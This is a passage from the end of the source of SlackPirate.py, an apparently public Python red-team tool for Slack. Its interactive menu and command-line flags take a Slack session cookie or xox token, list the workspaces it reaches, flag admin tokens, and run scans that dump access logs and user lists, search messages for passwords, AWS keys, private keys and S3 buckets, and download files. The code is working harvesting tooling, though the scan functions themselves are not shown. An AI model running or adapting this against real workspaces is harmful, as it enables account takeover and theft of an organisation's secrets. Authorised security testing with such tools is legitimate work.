        print(termcolor.colored("[Interesting Files]: No interesting files discovered.", "blue"))
        print('\n')


def file_cleanup(input_file, scan_context: ScanningContext):
    """
    these few lines of sweetness do two things: (1) de-duplicate the content by using Python Sets and
    (2) remove lines containing "com/archives/" <-- this is found in a lot of the  responses and isn't very useful
    """

    reference_file = pathlib.Path(f'{scan_context.output_directory}/{input_file}')
    if not reference_file.is_file():
        return
    with open(str(reference_file), 'r', encoding="utf-8") as file:
        lines = set(file.readlines())
    with open(str(reference_file), 'w+', encoding="utf-8") as file:
        for line in sorted(lines, key=str.lower):
            if "com/archives/" not in line:
                file.write(line)


def _choose_tokens(cookie, user_agent):
    """
    Find the list of workspaces for which a cookie has access and list them to use user to choose from. Used by the
    interactive command line and return the users list of choices.
    """

    print(termcolor.colored("[INFO]: Scanning for Workspaces using the cookie provided - this may take a while...\n", "blue"))
    tokens = list_cookie_tokens(dict(d=cookie), user_agent)
    if tokens:
        for i, (workspace, _, admin) in enumerate(tokens):
            if admin:
                print(termcolor.colored(f"[{str(i)}] {workspace} (admin!)", "magenta"))
            else:
                print(termcolor.colored(f"[{str(i)}] {workspace} (not admin)", "green"))
    else:
        print(termcolor.colored("[ERROR]: No Workspaces were found with this cookie", "red"))
        return None

    tokens = {str(k): v for k, v in enumerate(tokens)}

    selection_list = input("\n>> Select the Workspace(s) to continue. Comma separated values accepted: ").strip()

    selected_tokens = []
    if selection_list:
        selected = [s.strip() for s in selection_list.split(",")]
        for s in selected:
            if s in tokens:
                selected_tokens.append(tokens[s][1])
            else:
                print(termcolor.colored(f"[ERROR]: Invalid workspace choice: '{s}'", "red"))
                return None
        print()
    else:
        print(termcolor.colored("[ERROR]: No tokens selected", "red"))

    return selected_tokens


def _choose_scans():
    """
    Lists the possible scanning options to the user and allows them to choose which should be run. Used by the
    interactive command line and returns the list of chosen scans.
    """

    # Possible scans to run along with their names
    scan_options = {
        "A": ("Dump All",
              [dump_team_access_logs, dump_user_list, find_s3, find_credentials, find_aws_keys, find_private_keys,
               find_pinned_messages, find_interesting_links, download_interesting_files]),
        "0": ('Dump team access logs in .json format if the token provided is a privileged token', [dump_team_access_logs]),
        "1": ('Dump the user list in .json format', [dump_user_list]),
        "2": ('Find references to S3 buckets', [find_s3]),
        "3": ('Find references to passwords and other credentials', [find_credentials]),
        "4": ('Find references to AWS keys', [find_aws_keys]),
        "5": ('Find references to private keys', [find_private_keys]),
        "6": ('Find references to pinned messages across all Slack channels', [find_pinned_messages]),
        "7": ('Find references to interesting URLs and links', [find_interesting_links]),
        "8": ('Download files based on pre-defined keywords', [download_interesting_files]),
    }

    # Print options to terminal
    # print(termcolor.colored("The following scanning options are available:\n", "blue"))
    for key, (name, _) in scan_options.items():
        print(termcolor.colored(f"[{key}] {name}", "blue"))

    # Select scanning options
    selection_list = input("\n>> Select your scan option(s). Comma separated values accepted: ").strip()

    if not selection_list:
        print(termcolor.colored("[ERROR]: No scanning option selected", "red"))
        return []

    selection_list = selection_list.split(",")
    selection_list = [s.strip() for s in selection_list]

    if "A" in selection_list and len(selection_list) > 1:
        print(termcolor.colored("[ERROR]: Cannot provide 'A' with other options", "red"))
        return None

    selected_scans = []
    for s in selection_list:
        if s in scan_options:
            selected_scans.extend(scan_options[s][1])
        else:
            print(
                termcolor.colored(
                    f"[ERROR]: Invalid scan option provided: '{s}'", "red"
                )
            )
            return None

    return selected_scans


def _interactive_command_line(args, user_agent):
    """
    Runs the interactive command line interface.
    """

    # Check no flags provided (if you want to use flags don't use interactive mode)
    args_as_dict = vars(args).copy()
    del args_as_dict['cookie']
    del args_as_dict['token']
    del args_as_dict['verbose']
    del args_as_dict['interactive']

    no_flags_specified = all(value is None for value in args_as_dict.values())

    if not no_flags_specified:
        print(termcolor.colored("[ERROR]: You cannot use scan flags in interactive mode", "red"))
        return

    # Get cookie and token inputs
    if args.cookie and args.token:
        print(termcolor.colored("[ERROR]: You cannot use both --cookie and --token flags at the same time", "red"))
        return
    elif args.cookie:  # Providing a cookie leads to a shorter execution path
        provided_tokens = _choose_tokens(args.cookie, user_agent)
    elif args.token:
        provided_tokens = [args.token]
    else:
        cookie_or_token = input("Cookie: Go to Slack.com and copy the value for the cookie called 'd' (you must be signed in to at least one Workspace)"
                                                  "\nToken: Slack tokens start with 'XOX'"
                                                  "\n\n>> Please provide a cookie or token: ").strip()
        if re.fullmatch(SLACK_API_TOKEN_REGEX, cookie_or_token):
            provided_tokens = [cookie_or_token]
        else:
            provided_tokens = _choose_tokens(cookie_or_token, user_agent)

    if not provided_tokens:
        return

    selected_scans = _choose_scans()

    if not selected_scans:
        return

    global verbose
    verbose = args.verbose

    for provided_token in provided_tokens:
        collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)

        print(
            termcolor.colored(
                f"[Workspace Scan]: Scanning {collected_scan_context.slack_workspace}"
                + "\n",
                "magenta",
            )
        )

        pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
        print_interesting_information(scan_context=collected_scan_context)

        for scan in selected_scans:
            scan(token=provided_token, scan_context=collected_scan_context)


if __name__ == '__main__':
    # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
    colorama.init()

    parser = argparse.ArgumentParser(argument_default=None, description="This is a tool developed in Python which uses the native Slack APIs "
                                                 "to extract 'interesting' information from Slack Workspaces.")
    parser.add_argument('--cookie', type=str, required=False,
                        help='Slack \'d\' cookie. This flag will instruct the tool'
                             ' to search for Workspaces associated with the cookie.'
                             ' Results along with tokens will be printed to stdout')
    parser.add_argument('--token', type=str, required=False,
                        help='Slack Workspace token. The token should start with XOX.')
    parser.add_argument('-v', '--verbose', action="store_true",
                        help='Turn on verbosity for the output files')
    parser.add_argument('--interactive', dest='interactive', action='store_true',
                        help='enables the interactive command line for usability')
    parser.add_argument('--team-access-logs', dest='team_access_logs', action='store_true',
                        help='enable retrieval of team access logs')
    parser.add_argument('--no-team-access-logs', dest='team_access_logs', action='store_false',
                        help='disable retrieval of team access logs')
    parser.add_argument('--user-list', dest='user_list', action='store_true',
                        help='enable retrieval of user list')
    parser.add_argument('--no-user-list', dest='user_list', action='store_false',
                        help='disable retrieval of user list')
    parser.add_argument('--s3-scan', dest='s3_scan', action='store_true',
                        help='enable searching for s3 references in messages')
    parser.add_argument('--no-s3-scan', dest='s3_scan', action='store_false',
                        help='disable searching for s3 references in messages')
    parser.add_argument('--pinned-message-scan', dest='pinned_message_scan', action='store_true',
                        help='enable searching of pinned messages across all channels')
    parser.add_argument('--no-pinned-message-scan', dest='pinned_message_scan', action='store_false',
                        help='disable searching of pinned messages across all channels')
    parser.add_argument('--credential-scan', dest='credential_scan', action='store_true',
                        help='enable searching for messages referencing credentials')
    parser.add_argument('--no-credential-scan', dest='credential_scan', action='store_false',
                        help='disable searching for messages referencing credentials')
    parser.add_argument('--aws-key-scan', dest='aws_key_scan', action='store_true',
                        help='enable searching for AWS keys in messages')
    parser.add_argument('--no-aws-key-scan', dest='aws_key_scan', action='store_false',
                        help='disable searching for AWS keys in messages')
    parser.add_argument('--private-key-scan', dest='private_key_scan', action='store_true',
                        help='enable search for private keys in messages')
    parser.add_argument('--no-private-key-scan', dest='private_key_scan', action='store_false',
                        help='disable search for private keys in messages')
    parser.add_argument('--link-scan', dest='link_scan', action='store_true',
                        help='enable searching for interesting links')
    parser.add_argument('--no-link-scan', dest='link_scan', action='store_false',
                        help='disable searching for interesting links')
    parser.add_argument('--file-download', dest='file_download', action='store_true',
                        help='enable downloading of files from the Workspace')
    parser.add_argument('--no-file-download', dest='file_download', action='store_false',
                        help='disable downloading of files from the Workspace')
    parser.add_argument('--version', action='version',
                        version='SlackPirate.py v0.20. Developed by Mikail Tunç (@emtunc) with contributions from '
                                'the amazing community! https://github.com/emtunc/SlackPirate/graphs/contributors')
    """
    Even with "argument_default=None" in the constructor, all flags were False, so we explicitly set every flag to None
    This is necessary, because we want to differentiate between "all False" and "any False"
    """
    parser.set_defaults(team_access_logs=None, user_list=None, s3_scan=None, credential_scan=None, aws_key_scan=None,
                        private_key_scan=None, link_scan=None, file_download=None, pinned_message_scan=None)
    args = parser.parse_args()

    selected_agent = get_user_agent()

    if args.interactive:
        _interactive_command_line(args, selected_agent)
        exit()

    if args.cookie is None and args.token is None:  # Must provide one or the other
        print(termcolor.colored("[ERROR]: No arguments passed. Run SlackPirate.py --help ", "red"))
        exit()
    elif args.cookie and args.token:  # May not provide both
        print(termcolor.colored("[ERROR]: You cannot use both --cookie and --token flags at the same time", "red"))
        exit()
    elif args.cookie:  # Providing a cookie leads to a shorter execution path
        display_cookie_tokens(cookie=dict(d=args.cookie), user_agent=selected_agent)
        exit()
    # Baseline behavior
    provided_token = args.token
    collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)
    pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
    print(termcolor.colored("\n[INFO]: Token looks valid! URL: " + collected_scan_context.slack_workspace
                            + " User: " + collected_scan_context.username, "blue"))
    print(termcolor.colored("\n"))
    if check_if_admin_token(token=provided_token, scan_context=collected_scan_context):
        print(termcolor.colored("[BINGO]: You seem to be in possession of an admin token!", "magenta"))
        print(termcolor.colored("\n"))
    print_interesting_information(scan_context=collected_scan_context)

    # Possible scans to run along with their flags
    flags_and_scans = [
        ('team_access_logs', dump_team_access_logs),
        ('user_list', dump_user_list),
        ('s3_scan', find_s3),
        ('credential_scan', find_credentials),
        ('aws_key_scan', find_aws_keys),
        ('private_key_scan', find_private_keys),
        ('pinned_message_scan', find_pinned_messages),
        ('link_scan', find_interesting_links),
        ('file_download', download_interesting_files),
    ]

    args_as_dict = vars(args)  # Using a dict makes the flags easier to check
    # delete the cookie and token args which are not scan filter related so we can run all() and any() on the dict values
    verbose = args.verbose
    del args_as_dict['cookie']
    del args_as_dict['token']
    del args_as_dict['verbose']
    del args_as_dict['interactive']

    # no flags were specified - we run all scans
    no_flags_specified = all(value is None for value in args_as_dict.values())
    any_true = any(value == True for value in args_as_dict.values())  # are there any True flags?
    any_false = any(value == False for value in args_as_dict.values()) # are there any False flags?

    if no_flags_specified:
        for flag, scan in flags_and_scans:
            scan(token=provided_token, scan_context=collected_scan_context)
        exit()
    elif any_true and any_false:  # There were both True and False arguments
        print(
            termcolor.colored("[ERROR]: You cannot use both enable flags and disable flags at the same time", "red"))
        exit()
    elif any_true:  # There were only enable flags specified
        for flag, scan in flags_and_scans:
            if args_as_dict.get(flag, None):  # if flag is True, then run the scan
                scan(token=provided_token, scan_context=collected_scan_context)
    else:  # anyFalse - There were only disable flags specified
        for flag, scan in flags_and_scans:
            if args_as_dict.get(flag, None) != False:  # if flag is not False (None), then run the scan
                scan(token=provided_token, scan_context=collected_scan_context)
